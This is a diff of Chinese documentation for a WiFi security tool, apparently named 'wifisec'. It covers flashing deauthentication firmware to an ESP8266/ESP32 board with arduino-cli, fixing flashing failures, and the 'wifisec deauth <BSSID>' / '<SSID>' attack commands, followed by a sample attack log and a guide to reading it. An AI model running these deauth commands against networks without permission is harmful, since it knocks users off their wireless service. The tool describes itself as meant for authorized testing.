@@ -245,14 +245,75 @@ ESP→主机: [0x5A][cmd][len_lo][len_hi][payload]
 
 固件源码：[core/esp/esp.ino](../../core/esp/esp.ino)（目录结构已符合 Arduino 规范：文件夹名 `esp` 与文件名 `esp.ino` 一致）
 
-1. 安装 Arduino IDE 或 arduino-cli，添加对应开发板支持：ESP8266 用 `esp8266:esp8266`，ESP32 系列用 `esp32:esp32`。
-2. 用 Arduino IDE 直接打开 `core/esp/esp.ino`。
-3. 开发板选择对应型号（ESP8266 NodeMCU 板选 `NodeMCU 1.0 (ESP-12E Module)`，ESP32 如 `ESP32C5 Dev Module`），上传。
-   - **板型必须与实际硬件一致**，板型配置里的晶振频率写错会让 UART 波特率整体偏移（如选了 40MHz 晶振的 `Arduino Primo`，而 NodeMCU 实际是 26MHz 晶振，115200 会实际跑在 74880，表现为「串口有数据但不是有效 PONG」）。拿不准时 `esptool` 连接输出的 `Crystal is 26MHz` 是硬件事实，以此为准。
-4. 插入电脑，确认串口出现：
-   - macOS：`ls /dev/cu.usbserial-*` 或 `/dev/cu.wchusbserial-*`
-   - Linux：`ls /dev/ttyUSB*`（用户需在 `dialout` 组）
-   - Windows：设备管理器查看 `COMx`
+#### 方式一：arduino-cli（命令行，推荐）
+
+板型、波特率等配置直接写进 FQBN，不会像 IDE 那样因「下拉框选错板型」而烧出波特率错位的固件。
+
+**1. 安装工具链并添加 ESP8266 板卡索引**（一次性）：
+
+```bash
+brew install arduino-cli    # macOS；Linux/Windows 见官方安装文档
+
+# ESP8266 核心不在官方索引里，必须追加乐鑫社区索引
+arduino-cli config init
+arduino-cli config set board_manager.additional_urls \
+  https://arduino.esp8266.com/stable/package_esp8266com_index.json
+arduino-cli core update-index
+arduino-cli core install esp8266:esp8266
+```
+
+**2. 插上板子，确认串口被识别并记下端口名**：
+
+```bash
+arduino-cli board list
+# Port                 Type              Board Name  FQBN            Core
+# /dev/cu.usbserial-XXXX Serial Port (USB) Unknown                   unknown
+```
+
+板名显示 `Unknown` 是正常的：CH340/CP210x 等串口芯片不会回报板型，**端口对得上即可**。Linux 需把用户加入 `dialout` 组；Windows 端口形如 `COM3`。
+
+**3. 编译**——FQBN 的每一段都必须与实际硬件匹配，逐项说明：
+
+```bash
+arduino-cli compile \
+  --fqbn esp8266:esp8266:nodemcuv2:baud=115200,xtal=80,eesz=4M2M \
+  --build-path /tmp/esp-build \
+  core/esp/esp.ino
+```
+
+| 配置项 | 含义 | 为什么必须是它 |
+|:---|:---|:---|
+| `esp8266:esp8266:nodemcuv2` | 板型 = NodeMCU 1.0 (ESP-12E) | 板型定义携带晶振参数（26MHz）。选成 40MHz 晶振的板型（如 `Arduino Primo`），UART 波特率整体偏移为 115200 × 26/40 = 74880，主机端表现为「串口有数据但不是有效 PONG」（见 §5.5）。拿不准晶振频率时，`esptool` 连接日志输出的 `Crystal is 26MHz` 是硬件事实 |
+| `baud=115200` | 上传波特率 | 460800/921600 在 CH340 + 廉价线材组合下经常擦写超时；115200 稳定，全量烧录也就 30 秒左右 |
+| `xtal=80` | CPU 主频 80MHz | 固件对算力无要求；160MHz 只会加剧射频初始化时的电流浪涌（§5.5 掉电问题的诱因之一） |
+| `eesz=4M2M` | Flash 4MB，其中 2MB 作 SPIFFS | NodeMCU 标准规格。本固件不用 SPIFFS，选 `4M1M`（默认）也能跑，但保持与板子真实容量一致可避免烧录地址警告 |
+
+> 其他 ESP8266 板（Wemos D1 mini 等）把 `nodemcuv2` 换成对应 FQBN 即可，用 `arduino-cli board listall | grep -i esp8266` 查询全部候选。ESP32 系列需先 `arduino-cli core install esp32:esp32`，再换对应 FQBN（如 ESP32-C5，用 `board listall` 查询确切名称）。
+
+**4. 上传**：
+
+```bash
+arduino-cli upload \
+  --fqbn esp8266:esp8266:nodemcuv2 \
+  --input-dir /tmp/esp-build \
+  -p /dev/cu.usbserial-XXXX \
+  core/esp/esp.ino
+```
+
+- `--input-dir` 指向第 3 步的编译产物目录，保证烧的就是刚编译出来的那份固件，且不再触发二次编译。
+- 若连接阶段超时（`Timed out waiting for packet header`），macOS + CH340 的自动复位电路经常同步不到 bootloader——手动进下载模式再点上传：**按住 `FLASH` → 点按一下 `RST` → 松开 `FLASH`**。完整排错见 §5.5。
+- 若在 `Running stub...` 之后的擦写阶段超时，改用 §5.5 的 `--no-stub` ROM 直写流程（直接使用 `/tmp/esp-build/esp.ino.bin`）。
+
+**5. 验证**：烧录完成后板载 LED 应**快闪三下**（固件启动完成），随后进入每 0.5 秒一次的心跳闪烁。之后直接跑 `wifisec serial` / `wifisec deauth`（§5.6）即可，无需打开串口监视器。
+
+> 嫌两步麻烦也可用一条命令完成编译+上传：在第 3 步命令里追加 `--upload -p /dev/cu.usbserial-XXXX`。但保留 `--build-path` 产物目录对 §5.5 的 `--no-stub` 兜底流程有用，推荐分开执行。
+
+#### 方式二：Arduino IDE（图形界面）
+
+1. 用 Arduino IDE 直接打开 `core/esp/esp.ino`。
+2. 开发板选择对应型号（ESP8266 NodeMCU 板选 `NodeMCU 1.0 (ESP-12E Module)`，ESP32 如 `ESP32C5 Dev Module`），`Upload Speed` 选 `115200`，上传。
+   - **板型必须与实际硬件一致**，下拉列表里同名或近名的板型晶振参数可能不同（如 `Arduino Primo` 是 40MHz，NodeMCU 是 26MHz，选错则 115200 实际跑成 74880）。
+   - 插入电脑，确认串口出现：macOS `ls /dev/cu.usbserial-*`；Linux `/dev/ttyUSB*`（用户需在 `dialout` 组）；Windows 设备管理器查看 `COMx`。
 
 ### 5.5 烧录排错
 
@@ -285,12 +346,7 @@ mv ~/Documents/Arduino/libraries/<误放目录> ~/Documents/
 
 **连接成功但擦写阶段超时（`Timed out waiting for packet content`，发生在 `Running stub...` 之后）**：
 
-说明进下载模式与短包通信正常，高速 stub 在擦写 Flash 时丢包——多见于供电或线材临界。绕过 stub、直接用 ROM bootloader 烧录，慢但稳（115200 约 30 秒，无压缩）。先编译出镜像：
-
-```bash
-arduino-cli compile --fqbn esp8266:esp8266:nodemcuv2 \
-  --build-path /tmp/esp-build core/esp/esp.ino
-```
+说明进下载模式与短包通信正常，高速 stub 在擦写 Flash 时丢包——多见于供电或线材临界。绕过 stub、直接用 ROM bootloader 烧录，慢但稳（115200 约 30 秒，无压缩）。镜像直接复用 §5.4 第 3 步的编译产物 `/tmp/esp-build/esp.ino.bin`（若尚未编译，先执行该步命令）。
 
 再用开发板核心自带的 esptool（版本路径以实际为准）以 `--no-stub` 写入，连接阶段仍可配合手动下载模式按键：
 
@@ -323,11 +379,14 @@ WiFi 射频初始化瞬间电流可达 300mA 以上，超过 USB 口供电能力
 # 列出全部串口设备（确认板子被识别、取端口名）
 wifisec serial
 
-# 自动探测唯一 USB 串口
-wifisec deauth gunner
+# 按 BSSID 精确锁定目标（唯一 USB 串口时自动探测，无需指定端口）
+wifisec deauth <BSSID>
 
-# 多个串口设备时手动指定
-wifisec deauth <BSID> /dev/cu.usbserial-1410
+# 按 SSID 攻击（同名 SSID 的多个 AP 全部命中，轮流切信道）
+wifisec deauth '<SSID>'
+
+# 插了多个串口设备时手动指定端口
+wifisec deauth <BSSID> /dev/cu.usbserial-XXXX
 ```
 
 `wifisec serial` 输出示例（USB 设备置顶并给出 VID:PID，CH340 为 `1A86:7523`）：
@@ -335,11 +394,40 @@ wifisec deauth <BSID> /dev/cu.usbserial-1410
 ```
 端口                             类型  VID:PID    产品           序列号
 ───────────────────────────────────────────────────────────────────────
-/dev/cu.usbserial-1120           USB   1A86:7523  USB2.0-Serial  -
+/dev/cu.usbserial-XXXX           USB   1A86:7523  USB2.0-Serial  -
 /dev/cu.Bluetooth-Incoming-Port  系统  -          -              -
 ```
 
-协处理器会先以自身射频扫描周边网络（2.4GHz 芯片只回 2.4GHz 结果，ESP32-C5 同时回 5GHz），顺便绕过了 macOS 对未连接网络 BSSID 的脱敏；锁定目标后进入注入循环。
+一次完整运行的输出示例（目标与端口已脱敏）：
+
+```
+22:40:33.342 [信息] 连接 /dev/cu.usbserial-XXXX，等待固件就绪（打开串口会复位板子，boot 约需 1-2 秒）…
+22:40:34.161 [信息] 协处理器就绪（协议 v1 · 2.4GHz），通过 /dev/cu.usbserial-XXXX 扫描周边网络…
+22:40:36.391 [信息] 扫描完成：周边 22 个网络，命中目标 1 个
+22:40:36.391 [信息] 目标：<SSID>（<BSSID>）· 信道 4 · -53 dBm · deauth 帧 34 字节
+22:40:36.392 [信息] 开始 deauth 攻击：接口 /dev/cu.usbserial-XXXX · 目标 1 个 · 间隔 200ms（每 3s 报一次进度，Ctrl-C 停止）
+22:40:36.392 [警告] 仅用于授权测试，请确保目标网络为你所有或已获书面许可
+22:40:39.393 [信息] 进行中：已发送 15 帧 · 运行 3s
+22:40:42.393 [信息] 进行中：已发送 30 帧 · 运行 6s
+22:40:45.393 [信息] 进行中：已发送 45 帧 · 运行 9s
+…（此后每 3 秒一条）
+22:40:57.393 [信息] 进行中：已发送 105 帧 · 运行 21s
+^C
+22:40:58.114 [信息] 已发送 107 帧 · 目标 1 个 · 运行 21s
+```
+
+逐行判读：
+
+| 日志行 | 阶段 | 含义 |
+|:---|:---|:---|
+| `连接 … 等待固件就绪` | 复位 + 握手 | 打开串口触发板子复位，主机以 500ms 节奏重发 PING 直至收到 PONG（§5.3） |
+| `协处理器就绪（协议 vN · 频段）` | 能力协商 | 协议版本与 5GHz 能力位均来自固件 PONG，主机不猜板型 |
+| `扫描完成：周边 N 个，命中 M 个` | 扫描汇总 | 协处理器以自身射频扫描；2.4GHz 芯片看不见 5/6GHz 网络 |
+| `目标：…` | 目标明细 | SSID/BSSID/信道/RSSI/帧字节数逐条列明，多目标时逐行输出 |
+| `进行中：已发送 N 帧` | 注入进度 | 每 3 秒一条；数字是主机本地计数，固件注入不回 ACK、不占串口带宽 |
+| `已发送 N 帧 · …` | 退出统计 | Ctrl-C 触发，与进度心跳同源计数，可对账 |
+
+速率对账：200ms 间隔即每秒 5 帧，`进行中` 每条应恰好递增 15 帧；偏少说明串口写入受阻（线材/端口占用），持续掉线再查 §5.5 供电。板载 LED 与日志的对应关系见 §5.7。
 
 ### 5.7 LED 状态指示
 
